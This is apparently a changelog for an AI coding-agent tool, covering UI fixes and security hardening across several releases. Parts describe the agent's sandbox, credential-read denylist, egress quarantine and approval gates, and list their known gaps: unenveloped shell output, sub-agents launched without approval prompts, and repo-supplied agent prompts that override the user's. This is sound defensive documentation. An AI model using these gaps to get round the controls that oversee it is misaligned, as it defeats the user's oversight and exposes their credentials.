- **Toasts** (`src/tui/toast.ts`): transient single-line notifications rendered in the HUD
  block, TTL 3.2s, replaced (never queued) by newer toasts, and expired deterministically by
  one timer. They never enter `<Static>` — scrollback stays clean. All transient slash acks
  (`/theme`, `/style`, `/autonomy`, `/effort`, `/fast`, `/vim`, `/model`) and the `/copy`
  clipboard result now route through toasts instead of log lines.
- **HUD space discipline**: the toast competes for HUD rows through the same priority ladder
  (`fitHud`) the status strip uses — granted iff `height + 1 ≤ rows − 1`, else dropped.
  `showToast` mirrors the grant rule exactly before deciding and falls back to a dim log line
  only when the HUD cannot host the toast. Replacing an already-visible toast costs zero extra
  rows (no double-count against the ladder budget), and the width clamp reserves the real
  render indent + right margin + ellipsis so a clamped line can never overflow.
- **Context gauge in the status strip**: a live context-usage bar fed from usage events, with
  a marker at the configured summarization trigger ratio. Warns at ≥75%, hot at ≥90%; dropped
  first in the min strip tier so it never breaks the shrink ladder.
- **Platform-aware key hints**: composer placeholder and `/help` now say `Option+Enter` on
  macOS and `Alt+Enter` elsewhere (shared `IS_DARWIN` / `NEWLINE_HINT` in
  `src/tui/platform.ts`) instead of hard-coding the Mac key everywhere.
- **Background sub-agent completion notification**: a sub-agent finishing while the TUI is
  backgrounded now fires the existing desktop notification path (`emitNotification`) — no new
  notification system.
- **Turn-boundary hygiene**: `startTurn` clears any stale toast + timer so an ack from the
  previous turn cannot linger under a fresh Composer.

## [8.0.2] — 2026-08-17

### Fixed — pasted line endings no longer submit; only a typed Enter does

Refines the 8.0.1 batched-Enter fix per founder feedback: an unbracketed single-line paste
ending in a newline should insert as literal text — exactly what a bracketed paste does — not
fire a submit.

- The batched replay now matches ONLY a trailing bare `\r` — the one byte a typed Enter
  produces in raw mode. Trailing `\n` and `\r\n` are paste signatures (terminals send CRLF/LF
  for pasted newlines; nobody types CRLF) and take the legacy insert path: the text lands in
  the composer with its newline, and the user submits with a real Enter when ready.
- Bracketed paste (already excluded by its ESC markers and the in-flight paste gate) is
  unaffected; the 8.0.1 fix for text coalesced with a TYPED Enter (the `/goal` report) is
  unchanged.

## [8.0.1] — 2026-08-17

### Fixed — text coalesced with its Enter no longer swallows the submit

When a stdin read carried text AND its Enter in one chunk — fast typing across a busy frame,
tmux/SSH write batching, macro players — Ink delivered the whole chunk as a single keypress
with no `key.return`: the composer inserted the text plus a phantom trailing newline and the
submit silently never fired. `/goal` was the reported victim (type `/goal clear`, press Enter,
nothing happens); every slash command and message was equally affected on the batched path.

- The key router now recognizes the exact shape `<printable text><one trailing \r | \n | \r\n>`
  (`batchedTextReturn`, `src/tui/keys/common.ts`) and replays it as the two events the terminal
  would have delivered separately: the text insert, then a synthetic Enter. Byte-for-byte the
  same behavior as the same input unbatched.
- Everything else keeps its specialized path: the printable-only match excludes ESC-led
  sequences (mouse, DSR replies, cursor keys, bracketed-paste markers) and multi-line text, and
  an in-flight bracketed paste gates the replay entirely — a paste body ending in `\r` is
  literal content, not a submit. A lone Enter, Ctrl-chords, and paste transports are untouched.
- Known trade-off: an UNBRACKETED single-line paste with a trailing newline now submits, where
  it used to strand in the composer. Bracketed paste (the default, enabled at mount) is
  unaffected.

## [8.0.0] — 2026-08-17

### Changed — the web console, rebuilt as a full harness UI

`shadow web` was rebuilt from the old form-and-table console into a DeepSeek-Harness-style
workspace: three-pane shell (sessions · chat · inspector), a real chat surface with approvals
and queued prompts, a per-session activity timeline, and one settings sheet managing everything
the CLI manages. Same token-in-fragment security model, same project allowlist jail, same
events wire — the UI around it is new.

- **Shell (F1–F2):** new design system (`tokens.css` + rewritten `styles.css` — one accent, one
  type scale, light/dark/auto themes that apply pre-paint and survive refresh); app frame with
  collapsible sidebar, session list with live status dots and relative times, and hash routing
  (`#/s/<id>`) so sessions are bookmarkable and back/forward work.
- **Chat console (F4):** streaming transcript (markdown, tool cards with expandable
  output/diff, thinking rows), an approval dock (Allow once / Allow for session / Reject, plus
  structured `ask_user_question` answer forms), a prompt queue (messages typed mid-turn are held
  and drained one-per-completed-turn in order), a per-session autonomy menu that persists
  server-side, and turn stats (steps, LLM vs tool time, cache hit, tok/s from measured latency
  only — no more fabricated 1000 tok/s from an assumed 1 ms decode).
- **Telemetry surfaces (F5):** a **Trajectory** tab — the session as a dot-coded, timestamped
  timeline of every meaningful event, reading the same model as the transcript so the two cannot
  disagree — and an **Inspector** rail (session facts, usage accounting, last-12 request
  telemetry, sub-agents, pending asks, raw last-turn JSON tree, collapsible throughout).
- **Settings (F6):** one 1080×700 sheet — General (theme), Models (add preset / set default /
  enable / disable / delete, with the vault-locked case explained instead of a bare 409), Agents
  (built-ins read-only, create/delete custom), MCP servers (add/remove; takes effect next boot),
  Projects (the allowlist itself — removing one cascades closed sessions and refreshes the
  sidebar live). Every mutation rebuilds the pane from server state, so racing tabs cannot leave
  it lying.
- **Session model (F3):** the UI now runs on a single per-session store (turns → requests →
  rows) fed by SSE live and `/api/transcript` on hydrate, with bounds (200 KB assistant text,
  500 rows with a visible trim marker) and an optimistic user-row handshake that collapses the
  composer's echo without double-counting the turn.
- **Server (B1–B4):** per-session usage metrics and approval/ask events on the wire (the `todo`
  stream the CLI had, now wired for web sessions too), a durable session log so a refresh
  restores the full transcript, `approval_resolved` outcomes extended with `answered`, and
  read-only terminal-mirror sessions surfaced as non-promptable with a disabled composer.

### Fixed

- Web sessions never received `todo` events — the producer was wired in the CLI entry only.
  Now the session agent emits them on its own bus, so the task dock fills live.
- Answered `ask_user_question` prompts rendered as "✕ denied" end-to-end (the outcome label
  collapsed `{answers}` to the denial path). They now read "✓ answered".
- A queued prompt's user row could interleave before the finished turn's stats/stopped rows;
  drain now happens after the stop frame lands.
- Tool rows showed `args: undefined` — the wire field is `input`.
- Cross-turn latency mis-pairing fabricated tok/s from a stale measurement (cleared at endTurn).
- A session created in-app showed placeholder header/inspector data until a manual reload (the
  session list was only fetched at boot), and the client-derived title was clobbered by the
  server's "New session" placeholder on the next status tick. Both fixed; the title is also
  re-derived on hydration so it survives refresh.

### Fixed — adversarial review pass (shipped in the same release)

Six confirmed findings from the ship-time review workflow, each pinned by a test:

- Usage/latency pairing was inverted: `loop.ts` emits `usage` inside the stream loop and
  `latency` only in the stream's `finally`, so latency lands AFTER its usage. Single-request
  turns read `latencyMs: null` and multi-request turns could pair a stale measurement and
  fabricate tok/s. The record now backfills from the trailing latency event (both orders pair).
- Pre-execution denials and invalid-input rejections are emitted with no preceding
  `tool_start`; the web transcript dropped them (the TUI renders them). Terminal tool events
  now synthesize their row.
- Refreshing mid-turn force-closed the still-running turn — every post-refresh usage/tool
  result landed nowhere and a spurious "stopped" row rendered. Hydration now leaves the
  replay's trailing open turn open.
- The SSE subscription started BEFORE hydration: a live event racing the transcript fetch was
  wiped by `hydrate()`'s reset or double-applied after it. The console now hydrates from
  `/api/transcript` first and subscribes with `?after=<last-id>` — the two sources are a
  partition by event id (no gap, no doubles), with plain ring replay as the fetch-failure
  fallback.
- A parked approval with the tab closed held the process-wide run lock forever (the
  transport-gone path the approval gate documents was never implemented). The stream now
  reports client-count changes; when the last browser detaches with an ask open, a 120 s grace
  timer settles it as cancelled — a tab that comes back within the window stands it down.
- The sidebar's session-close button shadowed the API `del` with a local DOM element — DELETE
  was never sent and no error surfaced. Also, the confirm dialog's Escape handler was armed
  `{once:true}` so ANY keydown consumed it, and a nested Escape closed the underlying sheet
  too; it is now capture-phase, key-checked, and removed on resolve.

## [7.1.0] — 2026-08-16

### Fixed — TUI feel: wrapping, composer, render economy

The "world-class text wrapping + entry bar" review batch. Six-lens adversarial workflow +
firsthand review; every fix pinned by a new test.

- **Composer (the entry bar):**
  - Word-aware soft-wrap — prose never splits mid-word while the transcript above it word-wraps
    (space runs stay legal break points; a token wider than the row still hard-splits).
  - A caret at the end of a FULL row gets its own paint row — `wrap="truncate"` used to eat the
    caret cell exactly when you finished typing a row ("type a full line and the caret vanishes");
    the frame budget (`composerPaintRows`) agrees with the paint.
  - The caret under an emoji covers the whole grapheme cluster (no more � from a split surrogate).
  - ↑/↓ keep a goal column across short rows (readline behavior); any non-vertical key re-anchors.
  - Placeholder degrades to `Send a message…` on narrow terminals; the 5-row todo/plan chrome is
    charged to the frame budget only while expanded.
- **Transcript wrapping:**
  - OSC 8 hyperlinks measure by LABEL and a row boundary can never land inside an escape pair
    (committed rows degraded to raw unterminated URL fragments; split links degrade to plain text).
  - Text-default symbols + VS16 (❤️ ⚠️) measure 2 columns — `wrap="truncate"` used to silently
    delete the overrun column.
  - Hard-wrapped paragraph/quote prose REFLOWS to the terminal width (CommonMark soft breaks) — a
    model that wraps at ~72 cols used to render as a ragged 72-col block on a wide terminal.
    Code/headings/lists keep their source lines.
  - H1 underline matches the title in columns (CJK titles); finding-card headers truncate instead
    of splitting the border row; @-mention names clip to the menu bar; the running hint ladders
    down on narrow terminals; tool previews middle-truncate by columns, not UTF-16 units.
  - Argument-menu rows keep their FULL name (`/config get temperature`, `/theme colorblind`) —
    the @-mention clip initially applied to every menu row, and a clipped `colorbli…` broke both
    argument-menu tests. Only @-mention paths (arbitrarily long) clip; slash names pad only.
- **Render economy (the flicker fixes):**
  - DEC-2026 synchronized output now brackets ONCE per event-loop tick of writes — an Ink frame is
    ~3 writes, so per-write brackets flipped 3 half-frames per repaint, the very flicker the mode
    exists to kill. Content is never buffered (only the section close defers ~0ms); an exit guard
    can never leave the terminal inside an open section.
  - Live shell preview state updates at most every 50ms (chatty commands re-rendered per chunk);
    the flush now sanitizes the FULL accumulated text, so escapes split across chunks reassemble.
  - Streamed answer blocks commit on the 30ms flush tick instead of one commit per delta.
    Ordering is preserved structurally: every `pushLine` drains queued blocks first, so tool rows
    and turn-end can never land above an answer block; `/clear` drops the queue instead.
  - The keybindings hot-reload poller (1.5s mtime interval) is unref'd — the TUI process stays
    alive through its real I/O, not through the poller. Before this, any test that failed an
    assertion before `unmount()` leaked the interval and wedged the whole `node:test` runner
    forever (a red test hung the suite instead of failing it).

### Changed — v7.0.0 (2026-08-16 — GLOBAL RELEASE: the Frontier line goes public)

**Major bump by founder order (2026-08-16): "BUMP TO V7 AND DEPLOY GLOBALLY."** v7.0.0 is the
completed Frontier Launch Plan line — everything below shipped locally between v6.15.0 and
v6.28.0 while v6.14.0 remained the newest global release, now deployed to users in one step.
No code changes beyond the version; the sections beneath describe what is new **vs v6.14.0**:

- **Security:** grants can no longer smuggle reads or write-flags out of the workspace jail
  (quoted operands fail closed; the credential-read denylist grew 14→35 tiered entries; the
  denylist dialog is acknowledge-only; `apply_patch` reads before writing; MCP tool descriptions
  are enveloped and schemas shape-checked) (v6.15.0) · **egress quarantine** — an optional
  `observe`/`enforce` allowlist over model-authored web/search/image fetches, flagged on the
  egress receipt or denied (v6.24.0) · **MCP stdio children are OS-jailed** on macOS/Linux
  (network OFF by default, per-server grant is global-config-only) (v6.24.0) · sub-agent budget
  ceilings inherit the parent's remainder and roll spend up to the delegation root (v6.25.0).
- **Agentic surfaces:** named config profiles + `/fork` (v6.18.0) · `/rewind` prompt picker +
  vim f/F/t/T/yank + hooks v2 + reactive compaction (v6.19.0) · `shadow acp` — Shadow as an
  ACP v1 agent for editors (Zed et al.), approval bridged to the editor, fail-closed (v6.27.0).
- **TUI correctness + speed:** terminal-escape sanitization of all tool output; one display-width
  table; grapheme-safe batch-proof input; vim hard-line semantics (v6.17.0) · the onKey
  focus-owner router and the tui.tsx decomposition — no behavior change, all 11 swallowed-key
  regressions pinned (v6.21/v6.22.0) · resize never reflows; zero transcript scans per spinner
  tick (v6.22/v6.23.0) · paste registry bounded; `/sessions` + resume picker; OSC 11 theme
  auto-detect (v6.16.0).
- **Sessions & durability:** delta snapshots — session logs ~2.2× the transcript instead of
  ~100×; opt-in archive-over-delete retention (v6.20.0) · token-estimate cache (v6.26.0).
- **Docs:** THREAT_MODEL re-cut to v3 — every claim re-verified against the shipped code,
  including the new §3.13 sub-agent fan-out and §4.14 workspace-`.shadow` trust surface
  (v6.28.0); COMPAT_MATRIX.md (v6.12.0-era, already public).
- **The P1-GATE five-scenario live drill did not run before this release** — the founder's
  deploy order was explicit and immediate; the drill remains owed and now runs against the
  deployed build.

### Changed — v6.28.0 (Phase 3 close: THREAT_MODEL v3 re-cut, P3-12)

- **THREAT_MODEL.md re-cut to v3** — the closing item of the Frontier plan. The document's
  incrementally-patched claims were re-verified against the shipped v6.28 code, section by
  section, and every drifted statement was corrected. What changed:
  - **Status pin:** the header now names the re-cut (v3) and the version it matches (was: stale
    "matches v6.10.0" through thirteen releases).
  - **§1 philosophy:** "four mechanisms" → **six** — the egress broker (one audited chokepoint +
    quarantine tier) and the untrusted-content envelopes join the jail/sandbox/gate/secrets set;
    the OS sandbox now names MCP stdio children too.
  - **§3.2 credential denylist:** the stale 14-path enumeration is replaced by the real **35-entry
    `SECRET_READ_DENY`**, described by tier (SSH/cloud-CLI/package-manager → password-manager/
    browser/keychain, whole-directory denies with no per-command waiver → third-party stores and
    wallets) with the source file as the live list of record.
  - **§3.4 quarantine tier (new):** the v6.24 egress quarantine is now documented in the network
    section — `observe` (flag on the receipt, default) / `enforce` (deny) over exactly the
    model-authored `web`/`search`/`image` purposes, exact + `*.x.com` matching, bare wildcards
    admit nothing, operator-tier traffic never quarantined — and the section's "public host
    permitted" limit is re-scoped to what remains true (shell/MCP-child sockets the broker cannot
    see).
  - **§3.6 approval gate:** the read-only fast path's honesty hardening (P2-07) is stated —
    ambiguous operands (glob/tilde/var/quoted/newline) demote to the gate, and a granted command
    cannot smuggle reads or write-flags past its segment.
  - **§3.7 project config:** the enumeration is rebuilt around the pinned `PROJECT_UNTRUSTED_KEYS`
    set (23 keys — the live list of record), naming everything added since the v6.10 text (profiles,
    session-retention, the egress quarantine policy, vision upload target, plugin index keys,
    web-console project allowlist, permission rules, statusline, offline) plus the
    prototype-pollution guard in the merge.
  - **§3.11 limit (c) corrected:** MCP tool **descriptions ARE enveloped and capped since v6.15**
    (the old text still tracked F07-12 as open); what remains unwrappable is the schema itself,
    held by shape rules — names collapsed to the identifier alphabet, 32 KB schema cap,
    control-char fail-closed.
  - **§4.7 precision:** "HTTP MCP transport is not SSRF-guarded" overstated — it is
    operator-tier: configured LAN/internal URLs are allowed by design, cloud-metadata IPs
    refused, and the URL is the operator's, not the model's.
  - **§5 platform matrix:** new row for the MCP stdio jail (seatbelt + AF_UNIX denies /
    bwrap + private `/tmp` / none on Windows).
  - **§7 verification:** test count updated (2,100+), and the standing cadence is now stated:
    every security-tier release since v6.7.0 shipped behind a pre-commit adversarial find→verify
    review.
  - **Appendix A re-verified 2026-08-16:** every file:line call-site reference was re-located in
    the current source (most had drifted 13 releases), the quarantine note joins the preamble,
    and the two provider-POST sites are now correctly identified (streaming `streamWithRetry` +
    non-streaming `fetchNonStreamResponse`).
  - **New sections and honesty items from the review:** §3.13 documents sub-agent fan-out for the
    first time — the `agent` tool is risk `read` (at `auto-read`+ launches with **no approval
    prompt**), bounded by inheritance (a sub-agent never escalates), the `subagentConcurrency`
    FIFO cap, and the v6.25 budget ceilings; where its definitions load from (`~/.shadow/agents` <
    plugins < workspace, later wins — a cloned repo's agent overrides yours); and the limit that
    follows. §4.14 + a new §2 trust-table row state the corollary: workspace `.shadow/agents` +
    skills are repo-authored prompts with **no install or enable step**. §3.11 gains limit (f):
    shell-command output (`curl`/`wget`) is never enveloped — the approval gate and sandbox are
    the controls for that path. Appendix A now separates brokered egress from child-process paths
    (the plugin clone journals its own receipt; the Playwright npx resolution, Context Cooler
    install, and MLX/vLLM weight downloads do not — bounded by the offline wall, not the journal)
    and names the `/export` at-rest exception (redacted markdown under `<workspace>/exports/`,
    outside the 0700 logs tree).
- **Pre-commit adversarial review:** the re-cut itself was reviewed before commit (3 independent
  claims-vs-code finder lenses → per-finding adversarial refuters): 15 raw findings → **14
  confirmed, all fixed in this release**. Three were defects in the first draft of this very
  re-cut — a miscounted `PROJECT_UNTRUSTED_KEYS` (24 written, 23 real), `describe_media` wrongly
  placed inside the quarantine scope (it is operator-tier — its destination is
  `cfg.vision.baseUrl`), and a "URI operands demote to the gate" claim inherited from a stale
  code comment (they do not demote; the residual is documented instead and the comment corrected).
  The remainder were pre-existing gaps: the sub-agent / workspace-`.shadow` trust surface was
  absent from the document entirely, README carried the stale 14-path denylist count and an
  unqualified DNS-pin claim, and USER_GUIDE stated plugin precedence as uniform ("your files
  always win") when agent definitions are inverted.
- README and USER_GUIDE were synced to match (denylist count and tiers, DNS-pin runtime scope,
  per-surface precedence), and THREAT_MODEL.pdf regenerated from the v3 document.
- No behavior change: this release is documentation-only. **It closes the Frontier Launch Plan's
  item ledger** — every P2/P3 item is now DONE (P3-04 remainders stay pending founder decision by
  design). Remaining before global release: the founder-gated endgame (P1-GATE live drill, then
  the two-channel deploy).
- Fixed: a type error the v6.27 tree carried in `test/web-jail-enforcement.test.ts` (the
  `SessionApprovals` annotation used a dynamic-import value binding in a type position — TS2749);
  the annotation now comes from an erased type-only import. No runtime change.

### Added — v6.27.0 (Phase 3: ACP/IDE bridge, P3-11)

- **`shadow acp` — Shadow as an ACP (Agent Client Protocol) agent for editors (F09-12).** Editors
  that speak ACP — Zed first among them — can now spawn `shadow acp` and drive Shadow as their
  agent over stdin/stdout. JSON-RPC 2.0, one message per line. **Stdout is the RPC wire and
  nothing else:** every diagnostic, banner, warning, and vault prompt goes to stderr, so a stray
  byte can never corrupt the stream. The vault is unlocked at startup (keychain → env); under an
  editor stdin is a pipe and never a TTY, so the interactive password path can never fire here — a
  locked vault degrades exactly like it does for `shadow web` (the agent keeps serving; session
  builds that need a key fail with a clear error) and stdin stays exclusively the wire.

- **Built on the web-console machinery, not a parallel stack.** The ACP server reuses
  `createSessionRegistry` (the same lazy-build → run-lock → turn-runner pipeline with a guaranteed
  terminal `stop` frame on every path), `makeAgentBuilder`, and `makeTurnRunner` — so editor
  sessions inherit the per-turn jail re-resolve (E1), the process-wide run lock's FIFO queueing,
  and the terminal-frame guarantee for free. The one ACP-specific substitution is the approval
  gate: where the web console's `WebDenyGate` can only deny, the ACP gate bridges each tool call
  to the editor's `session/request_permission` so the user decides in the editor — while keeping
  the same fail-closed floor (every ambiguity, cancellation, and transport failure resolves to
  deny).

- **Permission mapping (pinned by tests):** `allow_once` → approve; `allow_always` → approve-for-
  session (the loop records it); `reject_once`/`reject_always`/cancelled/unknown/transport-error →
  deny. Acknowledge-only dialogs show a single "Acknowledge" option but the call is hard-blocked
  (F07-09 — informational). `user_question` is auto-answered with each question's first option
  (v0 editors have no question UI on this channel) plus a finding so the user sees what was
  answered; `plan_enter`/`plan_exit` auto-approve (non-destructive mode transitions — every call
  that follows is still gated). An already-aborted turn never starts an editor round-trip.

- **Event mapping (pinned by tests):** text → `agent_message_chunk`; thinking/finding/error →
  `agent_thought_chunk`; `tool_start` → `tool_call` (in_progress, with a kind mapped from the tool
  + its risk); `tool_end`/`tool_denied` → `tool_call_update` (completed/failed); todo → `plan`.
  Stop reasons map interrupted → cancelled, max_tokens → max_tokens, everything else → end_turn.
  Sub-agent-tagged events are prefixed `[subagent <id>]` so delegation is visible in the editor.

- **v0 scope, by design:** text-only prompts; no `session/load`, `session/set_mode`, or
  `session/set_model` (each returns a typed `method not found` with a reason, not a silent no-op);
  sessions are created only inside allowlisted project directories (`shadow acp --add-project <path>`
  is repeatable and idempotent, and a refusal names the exact remediation). No new egress: the
  adapter adds zero outbound surface — turns reach the provider only through the existing brokered
  path, and the editor speaks to Shadow over stdio inbound-only.

- **Adversarial review hardened it pre-commit (3-lens find→verify, 15 raw findings → 6 confirmed →
  4 unique defects, all fixed):** `session/prompt` now reads the ACP v1 spec's `prompt` field for
  the content blocks (the HIGH catch — the adapter previously read a `content` key, so every
  conforming editor prompt was refused with `-32602`; the legacy spelling is still accepted as an
  alias); **the ACP wire redacts at the same seam as the web console** — every `session/update`
  payload and every `session/request_permission` params object is scrubbed by the same `redact()`
  the web stream applies at its bus→wire boundary, so tool inputs, finding bodies, and text deltas
  are masked before they reach the editor's persisted thread store; **"Allow for this session"
  grants now actually last the session** — the registry holds one `SessionApprovals` per session,
  threaded through every turn's `AgentLoop` (TUI parity; grants used to die with the per-turn
  loop, re-prompting the editor every turn for the identical tool — the alarm-fatigue failure
  mode the approvals module exists to prevent); and a SIGINT/SIGTERM teardown now destroys the
  stdin handle, so the process exits after its own shutdown instead of being held open by the
  editor's pipe.

- **64 new tests** across the transport (framing, CRLF, split frames, malformed JSON survives the
  stream, outbound ids, abort semantics), the event mapper (every mapped + deliberately-unmapped
  shape), the permission gate (every decision + the editor params shape), and the server (full
  prompt round-trip over a real RPC wire, run-lock queueing across sessions, cancel, busy-second-
  prompt, project-allowlist refusal). Suite 2,072 → **2,136 green**.

### Changed — v6.26.0 (Phase 3: distribution footprint, P3-10)

- **dist/ is now UNTRACKED — an explicit decision, not drift (F06-11).** The ledger demanded a
  recorded ruling on the ~2MB of compiled JS carried in git since v6.14.0. The decision tree it
  set is mechanical: keep dist/ tracked only if the public mirror needs it — and the mirror
  never receives it (Channel B rsyncs `src/` + `test/` + the gate scripts only), the shipped
  binary bundles `src/index.ts` directly via Bun (dist/ is never read by `build-binary.sh`),
  and the npm path is private/dormant. So dist/ is untracked (`.gitignore`d) and built at
  release time only: `npm run check:release-gate` rebuilds it from source and byte-verifies
  freshness (`scripts/check-dist-fresh.mjs`, whose untracked-mode accepts the clean build as
  the artifact being checked) before any artifact ships. Every release commit stops churning
  ~2MB of rebuilt JS through history for zero shipping benefit; the freshness guarantee moves
  from "remember to commit dist/" to a gate that cannot be skipped by either release channel.

- **Token estimation no longer re-stringifies the whole history several times per turn
  (F06-12).** `provider.estimateTokens` JSON-stringifies every tool input on every call, and a
  single turn used to call it repeatedly (microcompact gate → maybeSummarize → the loop).
  `Context` now caches the heuristic pass and re-runs it at most once per history mutation —
  every mutation path (append/pinTask/reset/loadState/microcompact/stripImageBlocks/
  shrinkForOverflow/both compaction replacements) invalidates, and the provider object is part
  of the cache key so an adapter swap never reuses another estimator's numbers. The output is
  bit-identical to the old `max(heuristic, lastActualTokens)` — this is call elimination, not a
  new formula. One deliberate exception stays on the direct call: `truncateLocally`'s stop line
  measures the live message-only heuristic each iteration, because that is the one quantity
  tombstoning moves — caching it there would make the loop stop early or never.

### Changed — v6.25.0 (Phase 3: sub-agent budget ceilings + parent accrual, P3-09)

- **Sub-agent budgets are no longer unbounded (F04-08).** A sub-agent's Budget used to carry
  ONLY an iteration cap and a 30-minute wall-clock backstop — no token/cost ceilings at all — and
  its spend never accrued to the parent, so a model fanning out a fleet of `agent` calls could burn
  cost that the parent's `budget.maxCostUSD` / `budget.maxTotalTokens` never saw (worst in
  headless `--task`, where ONE budget spans the whole run). Now a sub-agent inherits the parent's
  REMAINING ceilings (tokens / cost / wall-clock) at admission — right after any concurrency queue
  wait, so the wall-clock share reflects real remaining time. An axis the parent never configured
  inherits none (the sub-agent keeps its iteration cap + wall-clock backstop there). An exhausted
  parent yields a zero ceiling, and the sub-agent's budget check runs BEFORE its first provider
  call — it stops immediately with zero spend instead of burning one call against an empty budget.
  Ceilings AND, never widen: an inherited ceiling can only ever tighten a sub-agent's own.

- **Sub-agent spend rolls up into the parent budget.** When a sub-agent finishes — done, cancelled,
  or error; the spend is real in all three cases — its TOTAL spend (its own provider calls plus any
  nested sub-agents it already rolled up) accrues into the parent's budget, and nested delegation
  chains one level at a time, so the parent's spending checks (`checkSpending` between turns and
  in-call) see the whole tree and `budget.maxCostUSD` actually bounds it. A *background* agent's
  spend rolls up into the ROOT of the delegation tree — the turn/run budget — rather than its
  immediate parent: a bg agent outlives its parent's loop by definition, and spend accrued into an
  already-finished budget would never be checked again, silently escaping the ceilings. No level is
  ever counted twice.

- **No `/cost` double-count.** The rolled-up spend is kept in separate accumulators: the parent's
  per-turn `usage` events (which drive the TUI's delta-based session counters) stay own-provider-
  only, and a sub-agent's spend reaches `/cost` exactly once through its own `subagent_usage`
  event, exactly as before. What changed is the CEILING MATH, not the display.

- **A ceiling-stopped sub-agent no longer masquerades as a completed one.** When a sub-agent stops
  on its (own or inherited) budget/iteration ceiling without producing an answer, the `agent` tool
  result and the background `task_notification` say so — `stopped by its budget ceiling` /
  `max_iterations ceiling` — instead of reporting an empty "completed".

- **Nested fan-out is width-capped.** A nested `agent` call bypasses the SESSION admission
  semaphore (the F06-10 deadlock guard — a queued child must not wait behind its own parked
  lineage), but before this it bypassed the width cap entirely: one sub-agent emitting N `agent`
  calls in a single message admitted all N at once, each inheriting the enclosing budget's FULL
  remaining ceilings — multiplicative N× overshoot against the tree's ceilings, visible only
  after the fact. Every parent budget now gets its own admission gate at the same
  `subagentConcurrency`. Deadlock-free by construction: permits in a parent's gate are held only
  by that parent's children, so a child only ever queues behind its own siblings, and queue waits
  are abortable like the session gate's.

- **Residuals (documented, by design).**
  - A ceiling is enforced BETWEEN provider calls (and in-call before enlisting each tool), so an
    agent can overshoot its remainder by at most its last call's cost.
  - Concurrent sub-agents admitted in one batch — top-level through the session semaphore, nested
    through the per-parent gate; both width-capped at `subagentConcurrency` — each read the
    parent's remaining-at-admission snapshot, so combined overshoot is bounded by K× the remainder
    and caught by the parent's next spending check, which then stops further work.
  - Per-turn budgets: in the multi-turn frontends (TUI/`--web`) each user message builds a fresh
    budget whose ceilings — exactly like the turn's OWN provider spend — expire with the turn.
    Bg-agent spend that arrives after its launching turn ended still reaches `/cost` (via its own
    `subagent_usage`) but does not count against the NEXT turn's ceilings. Headless `--task` is
    unaffected: one budget spans the whole run there, and late-arriving bg spend lands in it while
    it is alive.
  - An Esc'd SYNC sub-agent rolls its spend up into the turn budget as that turn unwinds (the
    abort stops the agent promptly, so the spend is bounded and small).

### Changed — v6.24.0 (Phase 3: egress quarantine + MCP confinement, P3-08)

- **Egress quarantine — the network dimension of the jail (FABLE-04 Phase 2).** The global-only
  `egress: { mode: 'observe' | 'enforce', allow: string[] }` config gates the fetches a *model*
  authored (`web_fetch` / `web_search` / remote-image — the `web`/`search`/`image` purposes).
  The default is **observe**: hosts outside the effective allowlist proceed but are flagged `⚑`
  in the egress receipt. `enforce` denies them with a readable, actionable error. The effective
  allowlist is `EGRESS_DERIVED_ALLOW` (duckduckgo.com + subdomains — where `web_search` actually
  speaks) plus your entries; `*.x.com` matches any subdomain depth but **never the apex**, and the
  matcher is encoding-normalized (trailing dots, `host:port` entries, bracketed/bare IPv6) so
  operator intent is never silently lost. `egress` is a **project-untrusted key** — a cloned repo
  can neither widen nor enforce it.

- **MCP stdio confinement (FABLE-04 Phase 3).** `run_shell`'s OS jail now extends to MCP stdio
  children (`wrapMcpArgv` shares the seatbelt/bubblewrap builders with `run_shell`, no shell
  layer): workspace+tmp writes, credential stores denied, **network OFF by default** (a stdio
  server is just pipes). Grants are per-server and global-only — `"network": true` opens sockets,
  `"sandbox": false` opts one server out. The bundled Playwright browser preset stamps both
  explicitly (a browsing browser needs sockets + broad fs; its isolation is the `--isolated`
  profile + capped output dir). AF_UNIX hardening for jailed children: macOS seatbelt denies
  connects to agent sockets under tmp (launchd/ssh/gpg — `(deny network*)` covers INET only, and
  SBPL has no `glob` matcher, so regex is used); Linux gives the child a **private tmpfs `/tmp`**
  (host `/tmp` carries ssh-agent sockets that `--unshare-net` cannot see). `run_shell`'s jail is
  unchanged. `sandboxFailurePolicy: 'fail-closed'` now REFUSES an unjailable child instead of
  silently spawning it unconfined. Windows has no OS jail — Shadow says so at startup.

- **The runtime receipt everywhere.** Every request through the broker is journaled to
  `~/.shadow/egress.log` (0600, rotated at 256 KiB, one rotation kept). `shadow doctor --privacy`
  now composes an **egress receipt** (hosts journaled — current + one kept rotation — denied,
  flagged ⚑, quarantine policy mode, journal path) and the zero-telemetry line is scoped to the
  requests Shadow itself makes (child sockets are confined at the OS layer, not the journal).
  `/connections` shows quarantine flags; `shadow egress` remains the full table. The ⚑ footer is
  mode-aware (no stale "switch to enforce" advice under enforce).

- **Netguard chokepoint hardening.** The netguard tier now forces `redirect: 'manual'` even when a
  caller passes `redirect: 'follow'` — per-hop re-entry into the broker is a chokepoint invariant,
  not a per-caller convention. (Pinned-Ips callers are exempt, as before.)

- **G4 zero-telemetry story (F09-11).** README "Zero telemetry" gains the explicit competitor
  contrast (hedged — analytics, crash dumps, completion telemetry, indexing uploads; public
  reporting has documented an agent shipping user repo contents), the one-command proof
  (`shadow egress` / `shadow doctor --privacy` / `/connections`), the egress-quarantine explainer
  with a JSON example, and the MCP-confinement paragraph with the Windows caveat. Claims are
  scoped so the receipt never overpromises (broker = Shadow's own process; THREAT_MODEL §3.8 +
  Appendix A re-cut to match the code).

### Changed — v6.23.0 (Phase 3: render remount economy, P3-03)

- **Render remount economy (F05-05).** Fold toggles (Ctrl-O) and redraws no longer re-wrap the
  entire transcript: flattened rows are memoized per item OUTSIDE the component (a WeakMap keyed
  on the item itself, with width / fold state / tool-run shape / palette colors as the variant
  key), so a `<Static>` remount reuses all previous wrap work and only items whose layout
  actually changed are re-flattened. The cache needs no reset — entries disappear with their
  items at `/clear` and context repaints, and theme switches invalidate automatically because
  the key stores the palette's VALUES, not the theme reference (`/theme` mutates the palette in
  place). Separately, **terminal resizes no longer reflow or wipe anything**: the terminal
  already rewraps printed scrollback natively when the width changes, so the old debounced hard
  reflow — which erased the ENTIRE scrollback on every resize, including pure height changes,
  even mid-stream — is deleted. The only scrollback wipe left is the explicit `app:redraw`
  action (opt-in `ctrl+l` binding). Known tradeoff: narrowing the terminal can leave a few
  persistent ghost rows above the live region until an explicit repaint (Ctrl-O/Ctrl-T,
  `app:redraw`, or `/clear`) — still strictly cheaper than the old wipe-everything behavior.

### Changed — v6.22.0 (Phase 3: tui.tsx decomposition, P3-02)

- **tui.tsx decomposition (F06-04).** The 6,738-line TUI monolith is split along its natural
